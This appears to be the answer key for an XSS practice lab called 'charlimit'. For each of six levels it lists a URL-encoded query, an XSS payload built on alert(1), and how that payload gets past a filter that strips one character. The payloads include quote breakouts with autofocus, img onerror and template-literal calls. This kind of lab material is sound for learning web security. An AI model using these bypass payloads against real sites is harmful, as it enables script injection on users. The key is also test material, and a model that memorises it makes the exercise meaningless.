# charlimit — solutions

Single-character stripping filters; choose a payload that doesn't need the stripped char.

### charlimit-level1

`/charlimit/level1/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: < and > stripped; break out of input value="…" with quote + autofocus

### charlimit-level2

`/charlimit/level2/?query=%27%20onmouseover=alert(1)%20x=%27`

- payload: `' onmouseover=alert(1) x='`
- context: " stripped but value is single-quoted; break out via '

### charlimit-level3

`/charlimit/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: quotes stripped; payload uses unquoted attributes

### charlimit-level4

`/charlimit/level4/?query=%3Cimg%20src=x%20onerror=alert%601%60%3E`

- payload: `<img src=x onerror=alert\`1\`>`
- context: parens stripped; tagged template literal call

### charlimit-level5

`/charlimit/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: / stripped; img is void, no slash needed

### charlimit-level6

`/charlimit/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: = stripped; script tag has no = at all
